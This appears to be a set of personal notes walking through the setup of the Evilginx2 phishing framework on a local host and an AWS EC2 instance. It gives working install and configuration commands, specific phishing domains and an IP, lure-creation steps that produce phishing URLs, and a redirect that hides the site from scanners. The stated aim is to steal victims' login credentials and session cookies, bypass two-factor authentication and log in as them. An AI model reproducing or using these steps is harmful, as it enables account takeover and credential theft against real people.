

```https://github.com/kgretzky/evilginx2```

```NOTE: You can run EVILGINX2 in a tmux session so that when you quit your ssh connection, the tool keeps on running.```

### Introduction:

Evilginx2 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection. 
What is means is Evilginx2 is siting in the communication between our victim and the actual legitimate login page capturing all traffic passed through. This means we can also capture the session cookies and inout them into our own browser allowing us to successfully authenticate ourselves as the victim, when it is time to login with the credentials we have aquired.


### Configuring EvilGinx2 on Host:

```
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2                                       
make           
sudo cp bin/evilginx /usr/bin
sudo cp -r phishlets/ /usr/share/evilginx/
sudo cp -r templates /usr/share/evilginx/
sudo evilginx
```

Run evilginx2 and if the phishlets have been loaded successfully you should see the tool run. 

Now you need to edit the config and ``` add your domain and IP and the redirect URL. ```

[ Any scanners scanning your domain without the ```lure parameter``` will automatically get redirected to the "redirect_url" you set up here ]

We also need to setup a TLS Certificate for our domain. the Evilginx tool can handle all that for us. 

ENTER:

``` 
: phishlets hostname therecap
therecap.tk
: phishlets enable therecap
```

***

### Configuring EvilGinx2 on Cloud:

Install and config Evilginx2 inside the instance you have created (Open a new tab, ssh back into the EC2, and complete the steps to install Evilginx)

* Since go is already installed we can eneter the following commands to set up Evilginx2:
            
```
sudo apt-get -y install git make
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
```
            
* If everything was done right you should be able to go ahead and run the program:
            
```sudo ./bin/evilginx -p ./phishlets/```
            
NOTE: Ignore warning - ```[!!!] Failed to start nameserver on port 53```



* Now that evilginx2 is istalled and running it is time to finish setting up the program to exucute the way we want it to (Complete the steps to properly configure evilginx2:):

* Set up the domain you are using (Enter the domain that you are using): 
            
```config domain raymondspizzeria.cf```
            
* Tell evilginx what IP it should be running on (Enter the ip from your ec2 instance):
            
```config ip 44.201.169.181```


***

### Creating Evilginx2 Lure:

The next task is to created a ```lure```, which would be the phishing URL to send the victims to.

```
: lures create therecap
[04:31:37] [inf] created lure with ID:
1

: lures get-url 1
https://www.therecap.tk/BMvzCci()y     (WHAT IS THIS URL?)
```

We also need to add the URL the victim will be redirected to AFTER logging in. This is different from the ```config redirect_url``` as that one is for the scanners and unintended users and this one is for the victims post-login.

```
: lures edit 1 redirect_url
https://www.therecap.org/
[04:46:06] [inf] redirect_url =
'https://www.therecap.org/'
```

Once that is in you can navigate to the lure URL to make sure its works properly.



***


